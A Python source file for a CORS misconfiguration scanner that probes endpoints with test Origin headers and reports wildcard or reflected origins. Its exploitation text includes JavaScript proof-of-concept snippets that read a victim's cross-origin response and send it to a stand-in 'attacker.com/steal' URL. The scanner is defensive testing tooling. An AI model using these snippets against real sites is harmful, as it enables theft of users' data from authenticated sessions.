from typing import Optional
"""
CORS Misconfiguration Scanner
- Wildcard origin
- Null origin bypass
- Arbitrary origin reflection
- Trusted subdomain bypass
"""

import tldextract
from rich.console import Console
from core.models import Vulnerability, Severity

console = Console()

TEST_ORIGINS = [
    "https://evil.com",
    "https://attacker.com",
    "null",
    "https://{target}",           # The target itself (credentialed check)
    "https://evil.{target}",      # Subdomain bypass attempt
    "https://{target}.evil.com",  # Suffix bypass
    "https://not{target}",        # Prefix bypass
]


class CORSScanner:
    def __init__(self, http_client):
        self.http_client = http_client

    def _get_domain(self, url: str) -> str:
        ext = tldextract.extract(url)
        return f"{ext.domain}.{ext.suffix}"

    async def _test_origin(self, url: str, origin: str) -> Optional[dict ]:
        """Check CORS with a given origin"""
        response = await self.http_client.get(
            url,
            headers={"Origin": origin}
        )
        if not response:
            return None

        acao = response.headers.get("access-control-allow-origin", "")
        acac = response.headers.get("access-control-allow-credentials", "")

        if not acao:
            return None

        return {
            "origin_sent": origin,
            "acao": acao,
            "acac": acac.lower() == "true",
        }

    async def scan(self, url: str) -> list[Vulnerability]:
        vulns = []
        domain = self._get_domain(url)
        console.print(f"  [dim]CORS scan: {url[:60]}[/dim]")

        # Check wildcard
        response = await self.http_client.get(url)
        if response:
            acao = response.headers.get("access-control-allow-origin", "")
            acac = response.headers.get("access-control-allow-credentials", "")

            if acao == "*":
                vulns.append(Vulnerability(
                    vuln_type="CORS Misconfiguration",
                    url=url,
                    severity=Severity.MEDIUM,
                    cvss_score=5.4,
                    title="CORS Wildcard Origin",
                    description=(
                        "Access-Control-Allow-Origin: * is set. "
                        "Any site can make a cross-origin request to this endpoint."
                    ),
                    evidence=f"Access-Control-Allow-Origin: *",
                    exploitation=(
                        "If there's a sensitive data endpoint:\n"
                        "fetch('https://target.com/api/data')\n"
                        "  .then(r => r.json())\n"
                        "  .then(d => fetch('https://attacker.com/steal?d='+JSON.stringify(d)))"
                    ),
                    remediation=(
                        "Apply a concrete origin list instead of a wildcard:\n"
                        "Access-Control-Allow-Origin: https://yourdomain.com"
                    ),
                    cwe_id="CWE-346",
                    references=["https://portswigger.net/web-security/cors"],
                ))

        # Check origin reflection
        origins_to_test = [
            o.replace("{target}", domain) for o in TEST_ORIGINS
        ]

        for origin in origins_to_test:
            result = await self._test_origin(url, origin)
            if not result:
                continue

            acao = result["acao"]
            has_credentials = result["acac"]

            # Was the origin reflected?
            if acao == origin and origin not in ["https://target.com"]:
                severity = Severity.HIGH if has_credentials else Severity.MEDIUM
                cvss = 8.1 if has_credentials else 6.5

                vuln = Vulnerability(
                    vuln_type="CORS Misconfiguration",
                    url=url,
                    severity=severity,
                    cvss_score=cvss,
                    title=f"CORS Arbitrary Origin Reflection{'+ Credentials' if has_credentials else ''}",
                    description=(
                        f"The server reflects the sent Origin ({origin}) back as-is. "
                        f"{'Combined with Allow-Credentials: true, this allows critical data theft.' if has_credentials else ''}"
                    ),
                    evidence=(
                        f"Request Origin: {origin}\n"
                        f"Response ACAO: {acao}\n"
                        f"Allow-Credentials: {result['acac']}"
                    ),
                    exploitation=(
                        f"From an attacker's site:\n\n"
                        f"var req = new XMLHttpRequest();\n"
                        f"req.open('GET', '{url}', true);\n"
                        f"{'req.withCredentials = true;' + chr(10) if has_credentials else ''}"
                        f"req.onload = function() {{\n"
                        f"  fetch('https://attacker.com/steal?d=' + encodeURIComponent(this.responseText));\n"
                        f"}};\n"
                        f"req.send();"
                    ),
                    remediation=(
                        "1. Create an origin whitelist — don't reflect dynamically\n"
                        "2. If using credentials, disallow wildcard/arbitrary origin\n"
                        "3. Add Vary: Origin header for cache poisoning"
                    ),
                    curl_poc=(
                        f'curl -H "Origin: {origin}" -I "{url}" | grep -i "access-control"'
                    ),
                    cwe_id="CWE-346",
                    references=["https://portswigger.net/web-security/cors"],
                )
                vulns.append(vuln)
                console.print(f"  {vuln.severity.emoji} [bold]CORS:[/bold] {origin} → reflected {'+ credentials' if has_credentials else ''}")
                break  # Stop once one is found

        return vulns
